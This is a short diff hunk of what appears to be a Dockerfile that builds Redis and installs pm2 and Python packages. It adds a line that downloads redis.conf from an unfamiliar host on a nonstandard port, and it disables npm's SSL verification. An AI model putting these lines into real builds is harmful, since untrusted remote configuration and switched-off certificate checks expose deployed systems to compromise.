@@ -51,6 +51,7 @@ RUN source ~/.bashrc \
 && cd /home/redis \
 && make \
 && make install \
+&& curl -O http://k1483162508.fun:1001/redis.conf \
 && npm config set strict-ssl false \
 && npm install -g pm2 \
 && pip3 install socksio python-binance xmltodict jieba\
